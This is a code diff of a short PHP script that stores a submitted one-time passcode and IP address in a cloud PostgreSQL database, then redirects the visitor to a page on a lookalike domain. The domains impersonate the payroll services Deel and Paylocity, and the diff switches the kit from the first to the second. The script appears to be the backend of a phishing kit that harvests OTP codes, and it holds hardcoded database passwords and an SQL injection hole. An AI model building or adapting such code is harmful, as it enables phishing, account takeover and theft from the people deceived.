@@ -1,11 +1,11 @@
 <?php 
-$db = pg_connect("host=pgtruist-truist.l.aivencloud.com port=13005 dbname=defaultdb user=avnadmin password=AVNS_P0lMTmzTuRpV_DjuWAM");
+$db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://deelofficial.signinverify.us/Deel.com/verification_processing.html");
+ header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/verification_processing.html");
 
 exit; 
 }
